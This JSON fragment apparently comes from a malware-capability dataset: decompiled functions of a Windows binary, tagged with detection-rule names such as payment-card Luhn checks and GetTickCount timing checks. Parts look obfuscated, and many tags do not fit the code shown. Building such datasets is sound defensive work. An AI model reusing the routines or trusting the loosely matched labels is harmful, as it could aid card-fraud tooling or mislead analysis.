(*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411d8e. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_07 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411dc2. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x12eb450)();\n        return;\n    }\n    fcn.00424c70();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0x1b8;\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411eef. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_08 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411f1d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_09 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411f4b. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_10 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00411f7f. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0xff991750)();\n        return;\n    }\n    fcn.0040b890();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0x248;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412088. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_11 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004120b6. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_12 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004120e4. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_13 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412112. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_14 + 9))();\n        return;\n    }\n    fcn.0040b890();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0x2d8;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412245. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_15 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412273. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_16 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004122a1. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_17 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004122cf. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_18 + 9))();\n        return;\n    }\n    fcn.0040b890();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    fcn.0042ad50();\n    uVar2 = *0x10 == 0x368;\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412402. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_19 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412430. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_20 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x0041245e. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_21 + 9))();\n        return;\n    }\n    fcn.00401d20();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x0041248c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_22 + 9))();\n        return;\n    }\n    fcn.00410d10();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004124ba. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_23 + 9))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x004124e8. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_24 + 9))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    if ((!uVar2) && (uVar2)) {\n    // WARNING: Could not recover jumptable at 0x00412516. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(extraout_EDX_25 + 9))();\n        return;\n    }\n    fcn.00401c60();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    (*pcVar1)();\n    arg_8h = 2;\n    (*pcVar1)();\n    (*pcVar1)();\n    fcn.0042ad2a(arg_8h);\n    return;\n}\n",
        "token_count": 5224
    },
    "00412a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412a70(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if (arg_8h != 0) {\n        if ((arg_8h < 0x80000000) && (iVar1 = fcn.0042b9b1(arg_8h * 2),  iVar1 != 0)) {\n            return iVar1;\n        }\n        arg_8h = 0;\n        fcn.0042b329(&arg_8h);\n        var_ch = 0x4453c4;\n        iVar1 = fcn.0042ba31(&var_ch, 0x44c830);\n    }\n    return iVar1;\n}\n",
        "token_count": 171
    },
    "00412ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412ad0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0x7 < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.0042b4b0(ppiVar4 + arg_8h * 2, ppiVar1 + (arg_8h + arg_ch) * 2, (uVar3 - arg_ch) * 2);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0x7 < in_ECX[5]) {\n            *(*in_ECX + piVar2 * 2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 384
    },
    "00412ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412ce0(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t arg_10h_00;\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < arg_ch) {\n        fcn.0042a19b(\"WJRI7WX91UD9AM\");\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - arg_ch;\n    if (arg_10h < piVar2) {\n        piVar2 = arg_10h;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.00412ad0(piVar2 + arg_ch, 0xffffffff);\n        fcn.00412ad0(0, arg_ch);\n        return;\n    }\n    if (0x7ffffffe < piVar2) {\n        fcn.0042a14e(0x4453fc);\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.00412b60(piVar2, in_ECX[4]);\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0x7 < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0x7 < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0x7 < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    arg_10h_00 = piVar2 * 2;\n    fcn.0042af40(arg_8h_00, ppiVar1 + arg_ch * 2, arg_10h_00);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x8) {\n        *(arg_10h_00 + in_ECX) = 0;\n        return;\n    }\n    *(arg_10h_00 + *in_ECX) = 0;\n    return;\n}\n",
        "token_count": 623
    },
    "00412de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412de0(uint noname_0, uint *arg_ch)\n\n{\n    if (7 < arg_ch[5]) {\n        fcn.0042ac49(*arg_ch);\n    }\n    arg_ch[5] = 7;\n    arg_ch[4] = 0;\n    *arg_ch = 0;\n    return;\n}\n",
        "token_count": 80
    },
    "00412e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412e10(uint *arg_8h, uint *arg_ch)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (7 < arg_8h[5]) {\n                fcn.0042ac49(*arg_8h);\n            }\n            arg_8h[5] = 7;\n            arg_8h[4] = 0;\n            *arg_8h = 0;\n            arg_8h = arg_8h + 7;\n        } while (arg_8h != arg_ch);\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00412e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00412e50(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t arg_8h_00;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e5b9;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    uVar1 = arg_8h[4];\n    arg_8h_00 = *(arg_ch + 0x10) + *(arg_10h + 0x10);\n    var_4h = 0;\n    if (((uVar1 <= arg_8h_00) && (arg_8h[5] != arg_8h_00)) && (cVar2 = fcn.00405d10(arg_8h_00, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = uVar1;\n        puVar3 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar3 = *arg_8h;\n        }\n        *(puVar3 + uVar1) = 0;\n    }\n    fcn.00405dc0(arg_ch, 0, 0xffffffff);\n    fcn.00405dc0(arg_10h, 0, 0xffffffff);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 405
    },
    "00412f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412f50(int32_t *param_1)\n\n{\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint var_4h;\n    \n    arg_8h = *param_1;\n    if (arg_8h != 0) {\n        arg_ch = param_1[1];\n        piVar1 = param_1 + 3;\n        piVar2 = param_1;\n        fcn.00412e10(arg_8h, arg_ch);\n        fcn.0042ac49(*param_1, arg_8h, arg_ch, piVar1, piVar2);\n    }\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 198
    },
    "00412fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412fa0(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t *arg_ch;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_ch_2;\n    uint var_1ch;\n    uint32_t var_20h;\n    uint *var_28h;\n    uint var_38h;\n    uint32_t var_3ch;\n    uint var_44h;\n    uint var_258h;\n    uint var_254h;\n    uint32_t var_58h;\n    uint var_22ch;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint in_stack_fffffd5c;\n    uint in_stack_fffffd60;\n    uint in_stack_fffffd64;\n    uint *noname_4;\n    uint *arg_8h;\n    uint uVar5;\n    uint var_26ch;\n    uint *var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint *var_258h_2;\n    int32_t var_254h_2;\n    uint *var_250h;\n    uint32_t var_249h;\n    uint var_238h;\n    uint32_t var_234h;\n    uint32_t var_22ch_2;\n    uint var_21ch;\n    uint32_t var_218h;\n    uint32_t var_210h;\n    uint var_200h;\n    uint32_t var_1fch;\n    uint32_t var_1f4h;\n    uint var_1e4h;\n    uint32_t var_1e0h;\n    uint32_t var_1d8h;\n    uint var_1c8h;\n    uint32_t var_1c4h;\n    uint32_t var_1bch;\n    uint var_1ach;\n    uint32_t var_1a8h;\n    uint var_1a0h;\n    uint32_t var_18ch;\n    uint32_t var_184h;\n    uint32_t var_174h;\n    uint32_t var_170h;\n    uint32_t var_168h_2;\n    uint var_158h_2;\n    uint32_t var_154h_2;\n    uint32_t var_14ch;\n    uint var_13ch;\n    uint32_t var_138h;\n    uint32_t var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x43e6c9;\n    var_ch_3 = *in_FS_OFFSET;\n    var_10h_2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00412fa0::var_ch_3;\n    var_154h_2 = 0xf;\n    var_158h_2 = 0;\n    var_168h_2 = var_168h_2 & 0xffffff00;\n    var_4h_2._0_1_ = 3;\n    var_4h_2._1_3_ = 0;\n    if (param_1 == 0) {\n        uVar5 = 0x1a;\n    }\n    else {\n        uVar5 = 0x1c;\n    }\n    uVar5 = fcn.00421020(uVar5);\n    uVar2 = fcn.0042b420();\n    fcn.00406270(uVar5, uVar2);\n    puVar3 = &fcn.00412fa0::var_168h_2;\n    arg_8h = &fcn.00412fa0::var_22ch_2;\n    noname_4 = 0x413032;\n    uVar5 = fcn.00412e50(arg_8h, puVar3, &fcn.00412fa0::var_ch_2);\n    var_258h_2 = &stack0xfffffd5c;\n    var_4h_2._0_1_ = 4;\n    fcn.00412f10(&stack0xfffffd5c, uVar5, &fcn.00412fa0::var_44h);\n    fcn.00424ac0(&fcn.00412fa0::var_268h, in_stack_fffffd5c, in_stack_fffffd60, in_stack_fffffd64, noname_4, arg_8h, \n                 puVar3);\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n    if (0xf < var_218h) {\n        fcn.0042ac49(var_22ch_2);\n    }\n    var_218h = 0xf;\n    var_21ch = 0;\n    var_22ch_2 = var_22ch_2 & 0xffffff00;\n    var_258h_2 = var_264h;\n    var_250h = var_268h;\n    if (var_268h != var_264h) {\n        do {\n            var_1a8h = 7;\n            var_1ach = 0;\n            var_1bch = var_1bch & 0xffff0000;\n            fcn.00412ce0(var_250h, 0, 0xffffffff);\n            var_4h_2._0_1_ = 7;\n            uVar5 = fcn.00424280(&fcn.00412fa0::var_1d8h, &fcn.00412fa0::var_1bch);\n            var_4h_2._0_1_ = 8;\n            uVar2 = fcn.00412e50(&fcn.00412fa0::var_210h, &fcn.00412fa0::var_168h_2, &fcn.00412fa0::var_ch_2);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n            arg_ch = fcn.004064b0(&fcn.00412fa0::var_1f4h, uVar2, uVar5);\n            uVar1 = var_184h;\n            var_170h = 0xf;\n            var_174h = 0;\n            var_184h = var_184h & 0xffffff00;\n            if (&fcn.00412fa0::var_184h != arg_ch) {\n                var_170h = 0xf;\n                var_174h = 0;\n                var_184h = uVar1 & 0xffffff00;\n                if (arg_ch[5] < 0x10) {\n                    fcn.0042b4b0(&fcn.00412fa0::var_184h, arg_ch, arg_ch[4] + 1);\n                }\n                else {\n                    var_184h = *arg_ch;\n                    *arg_ch = 0;\n                }\n                var_174h = arg_ch[4];\n                var_170h = arg_ch[5];\n                arg_ch[4] = 0;\n                arg_ch[5] = 0;\n            }\n            if (0xf < var_1e0h) {\n                fcn.0042ac49(var_1f4h);\n            }\n            var_1e0h = 0xf;\n            var_1e4h = 0;\n            var_1f4h = var_1f4h & 0xffffff00;\n            if (0xf < var_1fch) {\n                fcn.0042ac49(var_210h);\n            }\n            var_1fch = 0xf;\n            var_200h = 0;\n            var_210h = var_210h & 0xffffff00;\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_1c4h) {\n                fcn.0042ac49(var_1d8h);\n            }\n            var_1c4h = 0xf;\n            var_1c8h = 0;\n            var_1d8h = var_1d8h & 0xffffff00;\n            uVar5 = fcn.00424280(&fcn.00412fa0::var_1a0h, &fcn.00412fa0::var_1bch);\n            var_4h_2._0_1_ = 0xf;\n            uVar2 = fcn.00412e50(&fcn.00412fa0::var_130h, &fcn.00412fa0::var_168h_2, &fcn.00412fa0::var_ch_2);\n            var_4h_2._0_1_ = 0x10;\n            uVar5 = fcn.004064b0(&fcn.00412fa0::var_14ch, uVar2, uVar5);\n            var_4h_2._0_1_ = 0x11;\n            puVar3 = fcn.00424320(&fcn.00412fa0::var_249h + 1, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x12);\n            if (7 < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            iVar4 = fcn.00420f60(puVar3);\n            if (7 < var_234h) {\n                fcn.0042ac49(stack0xfffffdb4);\n            }\n            var_234h = 7;\n            var_238h = 0;\n            stack0xfffffdb4 = stack0xfffffdb4 & 0xffff0000;\n            if (0xf < var_138h) {\n                fcn.0042ac49(var_14ch);\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            if (0xf < var_11ch) {\n                fcn.0042ac49(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0xe);\n            if (0xf < var_18ch) {\n                fcn.0042ac49(var_1a0h);\n            }\n            if (iVar4 != 0) {\n                *(var_254h_2 + 0x1c) = *(var_254h_2 + 0x1c) + 1;\n                fcn.0040b5c0(*(var_254h_2 + 0x1c));\n                fcn.0040b880();\n            }\n            fcn.0042acb0(&fcn.00412fa0::var_114h, 0, 0x104);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x445418);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x447280);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x447254);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x44727c);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x44727c);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x447278);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x447274);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x447270);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x445418);\n            puVar3 = var_28h;\n            if (var_3ch < 0x10) {\n                puVar3 = &fcn.00412fa0::var_28h;\n            }\n            (**0x469258)(&fcn.00412fa0::var_114h, puVar3);\n            (**0x469258)(&fcn.00412fa0::var_114h, 0x445418);\n            puVar3 = fcn.00424280(&fcn.00412fa0::var_1a0h, &fcn.00412fa0::var_1bch);\n            var_4h_2._0_1_ = 0x13;\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            (**0x469258)(&fcn.00412fa0::var_114h, puVar3);\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_18ch) {\n                fcn.0042ac49();\n            }\n            noname_4 = &fcn.00412fa0::var_1bch;\n            uVar5 = fcn.00424280(&fcn.00412fa0::var_1a0h, noname_4);\n            var_4h_2._0_1_ = 0x14;\n            uVar2 = fcn.00412e50(&fcn.00412fa0::var_14ch, &fcn.00412fa0::var_168h_2, &fcn.00412fa0::var_ch_2);\n            var_4h_2._0_1_ = 0x15;\n            puVar3 = fcn.004064b0(&fcn.00412fa0::var_130h, uVar2, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x16);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            fcn.00420fc0(puVar3);\n            if (0xf < var_11ch) {\n                fcn.0042ac49();\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            if (0xf < var_138h) {\n                fcn.0042ac49();\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_18ch) {\n                fcn.0042ac49();\n            }\n            uVar5 = fcn.00424280(&fcn.00412fa0::var_1a0h, &fcn.00412fa0::var_1bch);\n            var_4h_2._0_1_ = 0x17;\n            uVar2 = fcn.00412e50(&fcn.00412fa0::var_14ch, &fcn.00412fa0::var_168h_2, &fcn.00412fa0::var_ch_2);\n            var_4h_2._0_1_ = 0x18;\n            puVar3 = fcn.004064b0(&fcn.00412fa0::var_130h, uVar2, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x19);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            fcn.00429f90(*(var_254h_2 + 0x20), &fcn.00412fa0::var_114h, puVar3);\n            if (0xf < var_11ch) {\n                fcn.0042ac49(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            if (0xf < var_138h) {\n                fcn.0042ac49(var_14ch);\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            if (0xf < var_18ch) {\n                fcn.0042ac49(var_1a0h);\n            }\n            if (0xf < var_170h) {\n                fcn.0042ac49(var_184h);\n            }\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n            if (7 < var_1a8h) {\n                fcn.0042ac49(var_1bch);\n            }\n            var_250h = var_250h + 7;\n        } while (var_250h != var_258h_2);\n    }\n    puVar3 = var_268h;\n    if (var_268h != NULL) {\n        for (; puVar3 != var_264h; puVar3 = puVar3 + 7) {\n            if (7 < puVar3[5]) {\n                fcn.0042ac49(*puVar3);\n            }\n            puVar3[5] = 7;\n            puVar3[4] = 0;\n            *puVar3 = 0;\n        }\n        fcn.0042ac49(var_268h);\n    }\n    var_268h = NULL;\n    var_264h = NULL;\n    var_260h = 0;\n    if (0xf < var_154h_2) {\n        fcn.0042ac49(var_168h_2);\n    }\n    var_154h_2 = 0xf;\n    var_158h_2 = 0;\n    var_168h_2 = var_168h_2 & 0xffffff00;\n    if (0xf < var_20h) {\n        fcn.0042ac49(var_ch_2);\n    }\n    var_20h = 0xf;\n    var_1ch = 0;\n    var_ch_2 